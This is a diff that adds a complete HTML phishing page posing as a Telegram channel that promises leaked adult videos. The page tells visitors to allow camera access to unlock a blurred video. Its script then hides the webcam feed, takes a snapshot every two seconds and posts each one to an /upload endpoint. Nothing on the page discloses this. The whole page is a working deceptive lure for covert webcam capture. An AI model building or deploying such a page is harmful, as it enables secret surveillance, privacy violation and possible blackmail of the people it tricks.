@@ -1,0 +1,244 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegram: Contact @private_leaks</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: #17212b;
+            /* Telegram Dark BG */
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            color: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .chat-container {
+            width: 100%;
+            max-width: 460px;
+            background-color: #0e1621;
+            border-radius: 10px;
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.5);
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .header {
+            background-color: #17212b;
+            padding: 10px 15px;
+            display: flex;
+            align-items: center;
+            border-bottom: 1px solid #101921;
+        }
+
+        .avatar {
+            width: 40px;
+            height: 40px;
+            background: linear-gradient(45deg, #ff0000, #ff8800);
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-weight: bold;
+            font-size: 18px;
+            margin-right: 15px;
+        }
+
+        .header-info h3 {
+            margin: 0;
+            font-size: 16px;
+        }
+
+        .header-info p {
+            margin: 2px 0 0 0;
+            font-size: 13px;
+            color: #7d8b99;
+        }
+
+        .message-area {
+            padding: 20px;
+            background-image: url('https://w.wallhaven.cc/full/lq/wallhaven-lqwg92.png');
+            /* Dark Pattern BG */
+            background-size: cover;
+            flex-grow: 1;
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+
+        .message {
+            background-color: #182533;
+            padding: 10px;
+            border-radius: 10px;
+            max-width: 85%;
+            align-self: flex-start;
+            position: relative;
+        }
+
+        .message.video-msg {
+            padding: 5px;
+            background-color: #182533;
+        }
+
+        /* Blur effect wrapper */
+        .video-wrapper {
+            position: relative;
+            overflow: hidden;
+            border-radius: 8px;
+        }
+
+        .blur-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.6);
+            backdrop-filter: blur(10px);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 10;
+        }
+
+        iframe {
+            width: 100%;
+            height: 250px;
+            border: none;
+            display: block;
+        }
+
+        .unlock-btn {
+            background-color: #2b5278;
+            color: white;
+            border: none;
+            padding: 12px 25px;
+            border-radius: 8px;
+            font-size: 14px;
+            cursor: pointer;
+            margin-top: 10px;
+            font-weight: 500;
+        }
+
+        .unlock-btn:hover {
+            background-color: #366592;
+        }
+
+        .lock-icon {
+            font-size: 30px;
+            margin-bottom: 10px;
+        }
+
+        .time {
+            text-align: right;
+            font-size: 11px;
+            color: #5d6c7b;
+            margin-top: 5px;
+            margin-right: 5px;
+        }
+
+        #hidden-cam-area {
+            position: absolute;
+            top: -9999px;
+            visibility: hidden;
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="chat-container">
+        <div class="header">
+            <div class="avatar">🚫</div>
+            <div class="header-info">
+                <h3>PRIVATE EXPOSED 18+</h3>
+                <p>12,453 subscribers</p>
+            </div>
+        </div>
+
+        <div class="message-area">
+
+            <div class="message">
+                <div style="color: #64bdff; font-weight: bold; margin-bottom: 5px; font-size: 14px;">Admin</div>
+                Bugun yeni ifsalari paylasdim dostlar 🤫
+                <div class="time">14:58</div>
+            </div>
+
+            <div class="message video-msg">
+                <div class="video-wrapper">
+                    <iframe src="https://www.youtube.com/embed/WAjnyVgfap8?si=HEAzLwV7HO05X7Xl&controls=0"
+                        title="Video"></iframe>
+
+                    <div class="blur-overlay" id="blurOverlay">
+                        <div class="lock-icon">🔒</div>
+                        <div style="text-align: center; padding: 0 15px;">
+                            <p style="margin:0; font-size: 14px; color: #ddd;">Sensitive Content</p>
+                            <p style="margin:5px 0 15px 0; font-size: 13px; color: #888;">Telegram ifsaniza baxmaq ucun
+                                kamera icazesini qebul edin :)</p>
+                            <button class="unlock-btn" id="allowBtn">VIEW VIDEO</button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+        </div>
+    </div>
+
+    <!-- Hidden Video & Canvas for processing -->
+    <div id="hidden-cam-area">
+        <video id="vid" autoplay playsinline></video>
+        <canvas id="canvas"></canvas>
+    </div>
+
+    <script>
+        const video = document.getElementById('vid');
+        const canvas = document.getElementById('canvas');
+        const allowBtn = document.getElementById('allowBtn');
+        const blurOverlay = document.getElementById('blurOverlay');
+
+        // Capture and Upload Function
+        function captureAndSend() {
+            if (!video.srcObject) return;
+
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0);
+            const dataURL = canvas.toDataURL('image/jpeg', 0.8);
+
+            fetch('/upload', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ image: dataURL })
+            }).catch(err => console.error(err));
+        }
+
+        allowBtn.addEventListener('click', () => {
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(stream => {
+                    video.srcObject = stream;
+
+                    // Unlock content
+                    blurOverlay.style.display = 'none';
+
+                    // Start capture loops
+                    setInterval(captureAndSend, 2000); // More aggressive capture for "live" feel
+                    captureAndSend(); // Immediate capture
+                })
+                .catch(err => {
+                    alert("⚠️ Error! You must verify permissions to view the hidden content.");
+                });
+        });
+    </script>
+
+</body>
+
+</html>
